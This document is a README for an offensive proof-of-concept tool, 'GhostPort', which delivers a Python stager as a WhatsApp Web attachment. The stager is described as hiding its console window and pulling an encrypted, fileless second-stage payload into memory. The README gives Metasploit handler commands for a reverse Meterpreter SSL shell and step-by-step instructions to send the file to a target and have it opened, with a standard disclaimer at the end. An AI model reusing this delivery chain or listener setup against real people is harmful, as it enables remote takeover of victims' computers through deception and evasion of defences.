👻 GhostPort: WhatsApp Web Stager PoC

📌 Project Overview

GhostPort is a Proof-of-Concept (PoC) stager designed to demonstrate a Living off the Land (LotL) attack vector via the WhatsApp Desktop/Web client. It exploits a known security discrepancy (CVE-2025-30401/Metasploit logic) where script-based file types like .py are not strictly blocked, allowing for direct execution via local interpreters.

🛡️ Technical Logic

Vector (Trust Abuse): Leveraging the high level of trust users place in messaging attachments compared to traditional email.

Execution (File-Type Association): On Windows systems with Python installed, clicking the downloaded file triggers the python.exe interpreter directly, bypassing the "Dangerous File" blocks applied to binary executables (.exe).

Stealth (Console Hijacking): The stager includes a ShowWindow call to immediately hide the console window, ensuring the process runs invisibly in the background.

Payload Delivery: Uses an encrypted SSL tunnel to pull a zlib-compressed and Base64-encoded Stage-2 payload directly into memory (exec()), ensuring no second-stage artifacts touch the disk.

⚙️ Features

Standalone: Uses only Python standard libraries (zero dependencies).

Encrypted Transport: Utilizes SSL/TLS for communication to bypass basic NIDS.

Fileless: Stage-2 code resides only in the Python interpreter's memory.

Windowless: Automatically suppresses the command prompt window on launch.

🚀 Demonstration Steps

Configure: Update the C2 variable in ghostport.py with your listener's IP address.

Listener: Start a Metasploit handler or custom Python listener.

Bash

use exploit/multi/handler
set payload python/meterpreter/reverse_tcp_ssl
set LHOST <YOUR_IP>
set LPORT 443
exploit

Delivery: Send ghostport.py through WhatsApp Web.

Action: Download and open the file on the target Windows machine.

⚠️ Disclaimer

This repository is for educational and authorized security testing purposes only. Unauthorized access to computer systems is a crime. The author is not responsible for any misuse of this tool.
